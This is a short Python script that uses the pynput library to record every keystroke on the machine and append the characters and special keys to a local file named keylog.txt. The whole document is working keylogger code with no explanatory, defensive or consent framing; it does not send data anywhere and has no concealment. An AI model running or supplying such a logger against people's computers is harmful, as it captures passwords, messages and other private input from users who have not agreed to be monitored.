from pynput import keyboard

# Log file location
log_file = "keylog.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" [{key}] ")

# Listener function
def on_press(key):
    write_to_file(key)

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
